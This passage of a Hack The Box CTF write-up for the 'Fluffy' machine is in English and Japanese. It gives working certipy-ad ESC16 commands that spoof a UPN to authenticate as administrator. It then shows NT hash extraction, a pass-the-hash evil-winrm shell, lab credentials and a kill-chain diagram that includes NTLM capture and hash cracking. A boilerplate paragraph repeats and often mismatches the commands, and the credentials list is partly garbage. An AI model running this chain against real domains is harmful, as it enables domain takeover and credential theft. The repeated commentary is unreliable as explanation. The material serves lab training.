certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.5.165 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
certipy-ad auth -dc-ip $ip -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

```bash
✅[6:40][CPU:12][MEM:67][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > certipy-ad auth -dc-ip $ip -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```powershell
evil-winrm -i $ip -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

```powershell
✅[6:42][CPU:5][MEM:68][TUN0:10.10.15.94][...ork/02.HTB/Writeup/Fluffy]
🐉 > evil-winrm -i $ip -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop\
*Evil-WinRM* PS C:\Users\Administrator\desktop> dir

    Directory: C:\Users\Administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/14/2026  11:07 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
6038b8305053a9af2b10078f72688364

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
Disabled Extensions: 1.3.6.1.4.1.311.25.2
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
p.agila → SERVICE ACCOUNTS グループ → ca_svc への GenericWrite 権限
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
CVE-2025-24071: Windows File Explorer spoofing  
CVE-2025-29968: AD CS denial of service
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
certipy-ad find -vulnerable
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
[!] Vulnerabilities
  ESC16: Security Extension is disabled.
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
servicePrincipalName: ADCS/ca.fluffy.htb
```

- `Disabled Extensions: 1.3.6.1.4.1.311.25.2`
```bash
sudo ntpdate 10.129.5.165
```
This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
1. 初期侵入: CVE-2025-24071 (NTLM リレー) → p.agila の認証情報
2. 権限昇格: BloodHound 分析 → 攻撃パス発見
3. グループ追加: p.agila → SERVICE ACCOUNTS
4. 属性変更: ca_svc の UPN → administrator
5. 証明書要求: ca_svc として User テンプレートで証明書取得
6. 認証: 証明書を使って administrator として認証
```

```powershell
certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
💡 Why this works  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## Credentials

- `j.fleischman / J0elTHEM4n1990!`
- `p.agila / prometheusx-303`
- `medium.com/@alt123/fluffy-htb-writeups-2cc66d335e26`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `HOME/work/scans/${timestamp}_${ip}.xml"`
- `53/tcp`
- `88/tcp`

## Lessons Learned / Key Takeaways

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

### Supplemental Notes

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートScan<br/>Rustscan/Nmap]
        K1B[AD環境Verify<br/>53,88,389,445,5985]
        K1C[RID Brute Force<br/>netexec --rid-brute]
        K1D[User発見<br/>p.agila,ca_svc,winrm_svc]

        K1A --> K1B --> K1C --> K1D
    end

    subgraph KC2["Kill Chain 2<br/>Initial Foothold準備"]
        direction TB
        K2A[SMB列挙<br/>smbclient -L]
        K2B[IT共有発見<br/>READ/WRITE権限]
        K2C[PDF発見<br/>Upgrade_Notice.pdf]
        K2D[CVE特定<br/>CVE-2025-24071]

        K2A --> K2B --> K2C --> K2D
    end

    subgraph KC3["Kill Chain 3<br/>Weaponization"]
        direction TB
        K3A[ペイロード作成<br/>python3 52310.py]
        K3B[Responder準備<br/>sudo responder -I tun0]
        K3C[認証情報使用<br/>j.fleischman]
        K3D[アップロード準備<br/>exploit.zip]

        K3A --> K3B --> K3C --> K3D
    end

    subgraph KC4["Kill Chain 4<br/>Initial Foothold"]
        direction TB
        K4A[ペイロード配置<br/>smbclient put]
        K4B[自動Executeトリガー<br/>File Explorer]
        K4C[NTLM HashRetrieve<br/>p.agila::FLUFFY]
        K4D[ハッシュクラック<br/>hashcat -m 5600]

        K4A --> K4B --> K4C --> K4D
    end

    subgraph KC5["Kill Chain 5<br/>権限チェーン分析"]
        direction TB
        K5A[時刻同期<br/>sudo ntpdate]
        K5B[BloodHound収集<br/>bloodhound-python]
        K5C[攻撃パス発見<br/>p.agila→SERVICE_ACCOUNTS]
        K5D[ESC16Verify<br/>certipy-ad find]

        K5A --> K5B --> K5C --> K5D
    end

    subgraph KC6["Kill Chain 6<br/>横展開"]
        direction TB
        K6A[グループ追加<br/>bloodyAD add groupMember]
        K6B[Shadow Credentials<br/>certipy-ad shadow auto]
        K6C[winrm_svcRetrieve<br/>NTハッシュ獲得]
        K6D[WinRM接続<br/>evil-winrm]

        K6A --> K6B --> K6C --> K6D
    end

    subgraph KC7["Kill Chain 7<br/>Privilege Escalation ESC16"]
        direction TB
        K7A[UPN変更<br/>ca_svc→administrator]
        K7B[証明書要求<br/>certipy-ad req]
        K7C[administrator.pfxRetrieve<br/>UPN偽装成功]
        K7D[認証<br/>certipy-ad auth]

        K7A --> K7B --> K7C --> K7D
    end

    subgraph KC8["Kill Chain 8<br/>目標達成"]
        direction TB
        K8A[NTハッシュRetrieve<br/>8da83a3fa618b6e3a...]
        K8B[Administrator接続<br/>evil-winrm -H hash]
        K8C[完全制御<br/>Domain Admin権限]
        K8D[FlagsRetrieve<br/>user.txt + root.txt]

        K8A --> K8B --> K8C --> K8D
    end

    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8

    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#81d4fa
    style KC8 fill:#ffccbc
    style K8C fill:#ff6b6b,color:#fff
```



## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2025-24071: https://nvd.nist.gov/vuln/detail/CVE-2025-24071
- CVE-2025-29968: https://nvd.nist.gov/vuln/detail/CVE-2025-29968
